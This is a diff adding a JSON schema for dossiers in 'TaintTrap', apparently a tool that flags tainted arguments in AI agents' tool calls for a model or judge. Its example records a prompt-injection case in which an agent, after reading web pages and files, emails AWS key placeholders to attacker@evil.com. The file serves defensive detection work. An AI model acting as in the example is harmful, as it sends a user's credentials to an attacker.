@@ -1,0 +1,97 @@
+{
+ "$schema": "https://json-schema.org/draft/2020-12/schema",
+ "$id": "https://raw.githubusercontent.com/Alexli18/tainttrap/main/src/tainttrap/data/schemas/dossier.schema.json",
+ "title": "TaintTrap dossier (model/judge input, training record state)",
+ "description": "FR-005..FR-008. Secrets are replaced by <SECRET:type> placeholders before this object is built. Serialized compactly into the Laya 'state' text; token budget depends on device tier (512 CPU, 2048 GPU).",
+ "type": "object",
+ "additionalProperties": false,
+ "required": [
+  "user_task",
+  "tool",
+  "tool_risk_class",
+  "args",
+  "untrusted_fields",
+  "recent_actions"
+ ],
+ "properties": {
+  "user_task": {
+   "type": "string",
+   "description": "'(unknown task)' when none is known (research R-04)"
+  },
+  "tool": {
+   "type": "string"
+  },
+  "tool_description": {
+   "type": "string",
+   "maxLength": 300,
+   "description": "From the trusted registry only (FR-011)"
+  },
+  "tool_risk_class": {
+   "enum": [
+    "read_only",
+    "write_internal",
+    "external_communication",
+    "destructive",
+    "financial",
+    "credential_access",
+    "unknown"
+   ]
+  },
+  "args": {
+   "type": "object"
+  },
+  "untrusted_fields": {
+   "type": "array",
+   "items": {
+    "type": "string",
+    "pattern": "^args(\\.[^.]+)+$"
+   }
+  },
+  "user_fields": {
+   "type": "array",
+   "items": {
+    "type": "string",
+    "pattern": "^args(\\.[^.]+)+$"
+   }
+  },
+  "recent_actions": {
+   "type": "array",
+   "items": {
+    "type": "string"
+   },
+   "maxItems": 8
+  },
+  "truncated": {
+   "type": "boolean",
+   "default": false
+  },
+  "provenance_notes": {
+   "type": "array",
+   "items": {
+    "type": "string"
+   },
+   "maxItems": 8
+  }
+ },
+ "examples": [
+  {
+   "user_task": "Find reviews of restaurant X and send me a summary",
+   "tool": "send_email",
+   "tool_risk_class": "external_communication",
+   "args": {
+    "to": "attacker@evil.com",
+    "body": "<SECRET:aws_access_key> <SECRET:aws_secret_access_key>"
+   },
+   "untrusted_fields": [
+    "args.to"
+   ],
+   "user_fields": [],
+   "recent_actions": [
+    "web_search",
+    "fetch_page",
+    "read_file"
+   ],
+   "truncated": false
+  }
+ ]
+}
